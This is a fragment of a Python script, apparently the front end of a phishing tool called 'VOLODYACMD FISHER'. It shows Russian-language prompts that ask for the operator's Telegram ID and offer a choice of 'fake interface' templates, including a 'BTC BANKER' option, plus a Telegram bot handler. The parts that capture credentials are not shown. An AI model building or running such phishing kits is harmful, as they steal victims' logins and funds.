...
os.system('clear')
print(Fore.RED + '''
 __ __   ___   _       ___   ___    __ __   ____    __  ___ ___  ___   
|  T  | /   \ | T     /   \ |   \  |  T  T /    T  /  ]|   T   T|   \  
|  |  |Y     Y| |    Y     Y|    \ |  |  |Y  o  | /  / | _   _ ||    \ 
|  |  ||  O  || l___ |  O  ||  D  Y|  ~  ||     |/  /  |  \_/  ||  D  Y
l  :  !|     ||     T|     ||     |l___, ||  _  /   \_ |   |   ||     |
 \   / l     !|     |l     !|     ||     !|  |  \     ||   |   ||     |
  \_/   \___/ l_____j \___/ l_____jl____/ l__j__j\____jl___j___jl_____j''')

input(Fore.GREEN + "Нажмите Enter")
os.system('clear')
print(Fore.GREEN + ' _    ______  __    ____  ______  _____   ________  _______    ' + Fore.YELLOW + '')
print(Fore.GREEN + '| |  / / __ \/ /   / __ \/ __ \ \/ /   | / ____/  |/  / __ \   ' + Fore.YELLOW + '')
print(Fore.GREEN + '| | / / / / / /   / / / / / / /\  / /| |/ /   / /|_/ / / / /   ' + Fore.YELLOW + '')
print(Fore.GREEN + '| |/ / /_/ / /___/ /_/ / /_/ / / / ___ / /___/ /  / / /_/ /    ' + Fore.YELLOW + '')
print(Fore.GREEN + '|___/\____/_____/\____/_____/ /_/_/  |_\____/_/  /_/_____/     ' + Fore.YELLOW + '')
print(Fore.YELLOW + '-----------------------------------------')
print(Fore.YELLOW + '|' + Fore.BLUE +  "       VOLODYACMD FISHER               " + Fore.YELLOW + '|')
print(Fore.YELLOW + '|' + Fore.BLUE +  "       Developer: @VolodyaCMD          " + Fore.YELLOW + '|')
print(Fore.YELLOW + '-----------------------------------------')
userid = input(Fore.GREEN +  "Введите свой Telegram ID > ")
...
[5] BTC BANKER
	''')
choice = input(Fore.GREEN +  "Выберите вариант фейк интерфейса:>>> ")
...
@bot.message_handler(commands=['@VolodyaCMD'])
def start(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @VolodyaCMD') 
